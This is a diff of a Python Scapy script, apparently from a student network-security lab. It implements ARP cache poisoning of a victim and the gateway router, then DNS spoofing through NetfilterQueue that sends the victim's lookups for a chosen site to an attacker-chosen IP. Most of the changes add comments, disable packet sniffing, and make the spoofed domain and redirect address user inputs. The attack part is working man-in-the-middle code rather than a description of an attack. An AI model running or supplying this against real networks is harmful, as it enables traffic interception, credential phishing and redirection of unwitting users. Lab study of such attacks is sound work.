@@ -40,7 +40,7 @@ def arp_poison():
         while (nrOfHosts < 2):
             nrOfHosts = input()
 
-    # The user is given the option to choose how often the ARP entries need to be updated
+    # The user is given the option to choose how often the ARP entries need to be updated.
     updateTimer = int(input("The the time (in seconds) it takes for the ARP entries to be updated (advice: Do not set it too high, e.g. > 60 seconds).\nSet update timer to: "))
 
     # If update timer is set to less than 1 seconds, a while loop is instantiated which can only be left if the update timer is set to greater or equal than 1.
@@ -86,7 +86,12 @@ def arp_poison():
             sendp(arp, iface="enp0s9")
     
     # Call sniff to start sniffing for incoming packets from victims
-    sniff(iface = "enp0s9")
+    # Sniff is technically unnecessary for the purpose of the code, as Wireshark will simply do sniff's work.
+    # If however you want to sniff the packets via Scapy and get a summary of them on Scapy, then you will need sniff.
+    # Keep in mind that while sniff is active, the code will not send ARP packets periodically.
+    # You will also need to ctrl+C the code to stop the sniffing and send spoofed ARP packets, and you will need to ctrl+C again to stop the code.
+    # Uncomment the following line to enable sniff:
+    #sniff(iface = "enp0s9")
 
     # A infinite loop is used to send ARP packages continuously updating the ARP tables of the victims
     while(True):     
@@ -123,14 +128,16 @@ def arp_poison():
 #   pip install netfilterqueue==0.9.0
 
 def dns_spoof():
-    # The user needs to input the ipVictim
-    ipVictim = raw_input("The IP address of the victim: ")
 
-    # The user needs to input the ipAttacker
-    ipAttacker = raw_input("The IP address of the attacker: ")
+    # In order to be able to perform a DNS spoofing attack on a victim we need to ARP poison both the victim and the gateway router.
+    # Hence the arp_poison() method is used to make this possible.
+    arp_poison()
 
-    # The user needs to input the ipGatewayRouter
-    ipGatewayRouter = raw_input("The IP address of the gateway router: ")
+    # The user needs to input the webpage he/she wants to DNS spoof.
+    url_webpage = raw_input("The URL of the webpage you want to DNS spoof: ")
+
+    # The user needs to input the ip of the host he/she wants the send the victim to.
+    ip_dns_spoof = raw_input("The IP address of the host you want to DNS spoof with (Note: your victim will be sent to this webpage): ")
 
     class DnsSnoof:
         def __init__(self, dns_hosts, queueNum):
@@ -174,10 +181,10 @@ def dns_spoof():
   
     if __name__ == '__main__':
         try:
-            #the hosts that we try to spoof
+            # The hosts that we try to spoof
             dns_hosts = {
-                b"tue.com.": ipAttacker,
-                b"site.com.": ipAttacker
+                url_webpage: ip_dns_spoof,
+                b"site.com.": ip_dns_spoof
             }
             queueNum = 1
             log.basicConfig(format='%(asctime)s - %(message)s', 
